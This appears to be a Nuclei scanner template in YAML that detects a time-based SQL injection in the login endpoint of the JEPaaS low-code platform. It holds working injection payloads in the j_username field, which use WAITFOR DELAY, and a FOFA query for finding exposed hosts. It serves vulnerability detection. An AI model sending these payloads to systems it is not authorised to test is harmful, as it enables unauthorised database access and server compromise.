http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=3 && duration_1<=4
            - duration_2>=6 && duration_2<=7
          type: dsl
      raw:
        - |
          POST /j_spring_security_check HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a33;WAITFOR DELAY @x--
        - |
          POST /j_spring_security_check HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a36;WAITFOR DELAY @x--
id: JEPaaS-j_spring_security_check-sql-injection
info:
    author: Superhero
    description: |-
        fofa: body="/saas/saasYhAction!sendRandom.action"
        JEPaaS 低代码平台j_spring_security_check 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: JEPaaS 低代码平台 j_spring_security_check SQL延时注入漏洞
    reference:
        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247484373&idx=1&sn=9fd1431524f1170bf798a17110c595cf&chksm=c267b6e6f5103ff0ac601457a6487410311d0c9c6cda227e653e834ea58299d69503e1f93209&token=1619136955&lang=zh_CN#rd
    severity: high
    tags: []
